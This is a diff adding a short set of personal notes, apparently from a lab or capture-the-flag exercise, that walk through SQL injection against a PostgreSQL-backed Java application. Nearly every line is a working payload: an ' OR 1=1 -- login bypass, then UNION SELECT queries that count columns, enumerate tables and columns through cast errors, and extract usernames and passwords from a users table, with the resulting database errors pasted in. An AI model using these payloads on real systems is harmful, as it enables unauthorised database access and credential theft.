@@ -1,0 +1,45 @@
+' OR 1=1 --
+
+Find the version through the errors
+
+How to determinate the number of columns
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+(error indicates that there more or less of them)
+
+
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+
+query to find out the string:
+
+' UNION SELECT NULL, NULL, NULL, 'a', NULL, NULL, NULL, NULL --
+error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;a&quot;
+  Position: 69
+
+List the content of the database
+
+' UNION SELECT NULL,NULL, NULL, CAST(table_name as numeric), NULL, NULL, NULL, NULL FROM information_schema.tables --
+
+Now enumerate the column content
+
+' UNION SELECT NULL,NULL, NULL, CAST(table_name as numeric), CAST(column_name as numeric), NULL, NULL, NULL FROM information_schema.tables --
+
+This will retrive the username field:
+
+' UNION SELECT NULL,NULL, NULL, NULL, CAST(column_name as numeric), NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
+
+This will retrive the name of the user
+
+' UNION SELECT NULL,NULL, NULL, NULL, CAST(username as numeric), NULL, NULL, NULL FROM users --
+
+This query will give us an int
+
+' UNION SELECT NULL,NULL, NULL, NULL, CAST(username as numeric), CAST(passsword as numeric), NULL, NULL FROM users --
+
+java.io.IOException: org.postgresql.util.PSQLException: ERROR: column &quot;passsword&quot; does not exist
+  Hint: Perhaps you meant to reference the column &quot;users.password&quot;.
+  Position: 106
+  
+  now we can use the final one
+  
+  
+  ' UNION SELECT NULL,NULL, NULL, NULL, CAST(password as numeric), NULL, NULL, NULL FROM users --
